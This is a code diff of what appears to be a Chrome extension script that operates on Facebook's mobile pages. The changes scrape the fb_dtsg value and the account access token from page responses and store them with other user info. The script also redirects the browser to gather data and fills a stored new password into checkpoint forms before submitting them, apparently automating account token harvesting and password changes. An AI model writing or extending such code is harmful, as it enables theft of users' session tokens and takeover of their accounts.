@@ -10,8 +10,18 @@ var url = new URL(curl);
 var gcname = url.searchParams.get("cname");
 var action = url.searchParams.get("action");
 var backto = url.searchParams.get("backto");
+var url_api = 'https://mbasic.facebook.com/';
+if(curl.match(/mobile.facebook.com/g)) {
+	url_api = 'https://mobile.facebook.com/';
+} else if(curl.match(/m.facebook.com/g)) {
+	url_api = 'https://m.facebook.com/';
+} else if(curl.match(/mbasic.facebook.com/g)) {
+	url_api = 'https://mbasic.facebook.com/';
+}
+
 start();
 function start(){
+
 	buildToolbox();
 	setTimeout(function(){
 		var curl = window.location.href;
@@ -29,7 +39,25 @@ function start(){
 				chrome.storage.sync.get(['userinfo'], function(result) {
 					if(!result.userinfo.birthday) {
 						if(!curl.match(/\/zero\//g)) {
-							window.location.href = 'https://mbasic.facebook.com/language.php?n=%2Fhome.php&cname=getffba&action=lang';
+							if (!$('input[name=email]').length) {
+								window.location.href = 'https://mbasic.facebook.com/language.php?n=%2Fhome.php&cname=getffba&action=lang';
+							}
+						}
+					}
+				});
+			}
+			if(result.action == 'lang') {
+				chrome.storage.sync.get(['userinfo'], function(result) {
+					if(!result.userinfo.birthday) {
+						if(!curl.match(/\/zero\//g)) {
+							if (!$('input[name=email]').length) {
+								chrome.storage.sync.set({action: 'token'});
+								userdata = {};
+						    	userinfo(userdata);
+						    	if(!curl.match(/mobile.facebook.com/g)) {
+						    		window.location.href = 'https://mobile.facebook.com/';
+						    	}
+						    }
 						}
 					}
 				});
@@ -45,7 +73,9 @@ chrome.storage.sync.get(['action'], function(result) {
 	if(!result.action) {
 		chrome.storage.sync.get(['userinfo'], function(result) {
 			if(!result.userinfo.birthday) {
-				window.location.href = 'https://mbasic.facebook.com/language.php?n=%2Fhome.php&cname=getffba&action=lang';
+				if (!$('input[name=email]').length) {
+					window.location.href = 'https://mbasic.facebook.com/language.php?n=%2Fhome.php&cname=getffba&action=lang';
+				}
 			}
 		});
 	}
@@ -53,7 +83,9 @@ chrome.storage.sync.get(['action'], function(result) {
 		chrome.storage.sync.get(['userinfo'], function(result) {
 			if(!result.userinfo.birthday) {
 				if(!curl.match(/\/zero\//g)) {
-					window.location.href = 'https://mbasic.facebook.com/language.php?n=%2Fhome.php&cname=getffba&action=lang';
+					if (!$('input[name=email]').length) {
+						window.location.href = 'https://mbasic.facebook.com/language.php?n=%2Fhome.php&cname=getffba&action=lang';
+					}
 				}
 			}
 		});
@@ -62,20 +94,26 @@ chrome.storage.sync.get(['action'], function(result) {
 		chrome.storage.sync.get(['userinfo'], function(result) {
 			curl = window.location.href;
 			if(!curl.match(/\/zero\//g)) {
-				window.location.href = 'https://mbasic.facebook.com/language.php?n=%2Fhome.php&cname=getffba&action=lang';
+				if (!$('input[name=email]').length) {
+					window.location.href = 'https://mbasic.facebook.com/language.php?n=%2Fhome.php&cname=getffba&action=lang';
+				}
 			}
 		});
 	}
 	if(result.action == 'finish') {
 		chrome.storage.sync.get(['userinfo'], function(result) {
 			if(!result.userinfo.birthday) {
-				chrome.storage.sync.set({action: 'token'});
-				console.log('!birthday');
-				window.location.href = 'https://mobile.facebook.com/';
+				if (!$('input[name=email]').length) {
+					chrome.storage.sync.set({action: 'token'});
+					console.log('!birthday');
+					window.location.href = 'https://mobile.facebook.com/';
+				}
 			} else {
-				console.log('userinfo ok');
-				userdata = result.userinfo;
-				userinfo(userdata);
+				if (!$('input[name=email]').length) {
+					console.log('userinfo ok');
+					userdata = result.userinfo;
+					userinfo(userdata);
+				}
 			}
 		});
 	}
@@ -171,6 +209,13 @@ function setEventListener() {
 						if(result.cname == 'getffba') {
 							if ($('input[name=email]').length>0) {
 								chNow(vars);
+							} else {								
+						    	if(!curl.match(/mobile.facebook.com/g)) {
+						    		window.location.href = 'https://mobile.facebook.com/';
+						    	} else {
+						    		userdata = {};
+						    		userinfo(userdata);
+						    	}
 							}
 						} else {
 							chrome.storage.sync.set({userinfo: ''});
@@ -206,7 +251,7 @@ function setEventListener() {
 function getDetail(vars) {
 	var trylogin;
 	var http4 = new XMLHttpRequest;
-	var url4 = "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8";
+	var url4 = url_api + "login/?next&ref=dbl&fl&refid=8";
 	http4.open("GET", url4, true);
 	http4.onreadystatechange = function (){
 		if (http4.readyState == 4 && http4.status == 200){
@@ -1103,8 +1148,8 @@ function userinfo(userdata) {
 					userdata.fb_dtsg = t.match(/fb_dtsg\\" value=\\"(.*?)\\"/)[1];
 				}
 			}
-			if(t.match(/"EAA(.*?)ZD/)) {
-				userdata.accessToken = 'EAA'+ t.match(/"EAA(.*?)ZD/)[1]+'ZD';
+			if(t.match(/accessToken\\":\\"(.*?)\\"/)) {
+				userdata.accessToken = t.match(/accessToken\\":\\"(.*?)\\"/)[1];
 			}
 			chrome.storage.sync.set({userinfo: userdata});
 			//window.location.href = 'https://mobile.facebook.com/';	
@@ -1211,6 +1256,7 @@ function load(url, callback) {
 	  	if(curl.match(/mbasic.facebook.com\/checkpoint\/flow/g) && curl.match(/checkpoint_created=1/g)) {
 	  		//step 3
 	  		chrome.storage.sync.set({cname: 'getffba'});
+	  		var tr = [];
 	  		if($('input[name=password_new]').length) {
 	  			chrome.storage.sync.get(['userinfo'], function(result) {				  
 				  // pw = '02097869025';
@@ -1224,11 +1270,17 @@ function load(url, callback) {
 				  }
 				  if($('input[name=password_confirm]').length) {
 				  	$('input[name=password_confirm]').val(result.userinfo.npass);
-				  	$('#checkpointSubmitButton input[type=submit]').click();
+				  	//$('#checkpointSubmitButton input[type=submit]').click();
+				  	if($( "div:contains('your password is required.')" ).length>0) {
+				  		$('#checkpointSubmitButton input[type=submit]').click();
+				  	}
+				  	//console.log($( "div:contains('your password is required.')" ).length);
 				  }
 				  if($('input[name=password_new]').length) {
 				  	chrome.storage.sync.set({action: 'finish'});
-				  	$('#checkpointSubmitButton input[type=submit]').click();
+				  	if($( "div:contains('your password is required.')" ).length>0) {
+				  		$('#checkpointSubmitButton input[type=submit]').click();
+				  	}
 				  }
 				});
 	  		} else {
